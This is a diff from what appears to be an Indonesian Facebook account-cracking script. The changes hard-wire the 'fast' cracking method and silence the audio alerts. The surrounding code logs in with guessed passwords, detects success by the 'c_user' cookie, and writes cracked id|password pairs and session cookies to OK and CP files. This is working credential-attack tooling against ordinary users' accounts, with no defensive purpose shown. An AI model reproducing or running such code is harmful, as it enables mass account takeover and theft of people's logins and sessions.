@@ -1441,15 +1441,15 @@ def setting():
         ualuh.append("tidak")
 
      # Pilihan kecepatan metode
-    # metcepat()
-    Console().print(Panel(f"{P2}[{color_text}01{P2}] Metode Slow {P2}\n"f"{P2}[{color_text}02{P2}] Metode Cepat {P2}",width=60,style=f"{color_panel}"))
-    hc = console.input(f" {H2}• {P2}Masukan : ").strip()
-    if hc in ["1", "01"]:
-        metslow()
-    elif hc in ["2", "02"]:
-        metcepat()
-    else:
-        metcepat()  # Default ke metode cepat
+    metcepat()
+    #Console().print(Panel(f"{P2}[{color_text}01{P2}] Metode Slow {P2}\n"f"{P2}[{color_text}02{P2}] Metode Cepat {P2}",width=60,style=f"{color_panel}"))
+    #hc = console.input(f" {H2}• {P2}Masukan : ").strip()
+    #if hc in ["1", "01"]:
+        #metslow()
+    #elif hc in ["2", "02"]:
+        #metcepat()
+    #else:
+        #metcepat()  # Default ke metode cepat
         
 
 # -------------------[ CRACK-SLOW ]------------#
@@ -1888,7 +1888,7 @@ def fanky_b_api(idf,pwv):
 				tree.add(Panel.fit(f"{K2}{tahun(idf)}{P2}", style=f"{color_panel}"))
 				tree.add(Panel(f"{M2}{ua}{P2}", style=f"{color_panel}"))
 				prints(tree)
-				os.popen('play-audio c.mp3')
+				#os.popen('play-audio c.mp3')
 				open("CP/" + cpc, "a").write(idf + "|" + pw + "\n")
 				break
 			elif "c_user" in ses.cookies.get_dict().keys():
@@ -1901,7 +1901,7 @@ def fanky_b_api(idf,pwv):
 				tree.add(Panel(f"{U2}{ua}{P2}", style=f"{color_panel}"))
 				tree.add(Panel(f"{U2}{kuki}{P2}", style=f"{color_panel}"))
 				prints(tree)
-				os.popen('play-audio o.mp3')
+				#os.popen('play-audio o.mp3')
 				open("OK/" + okc, "a").write(idf + "|" + pw + "\n")
 				break
 			else:
